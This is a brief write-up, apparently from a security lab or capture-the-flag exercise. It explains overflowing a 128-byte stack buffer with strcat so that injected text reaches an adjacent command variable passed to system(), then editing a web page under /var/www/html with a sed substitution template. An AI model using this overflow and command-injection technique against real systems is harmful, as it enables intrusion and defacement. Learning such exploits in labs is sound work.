Justifing the exploit:
/*Memory Stack
|--------------------------------------|------|-----------------------------------------------------|
    greeting_text                      command     buffer
|                  128                 |  48  |         256                                         |
*/
We overflow greeting_text using strcat(greeting_text, buffer) to get to command and insert commands to have them executed in the code line system(command)

We found the document for the web page in var/www/html and then we ran a text substitution line command for linux (sed -i 's/[WHAT_REPLACE]/[WHAT_REPLACE_FOR]' [FILE_NAME])
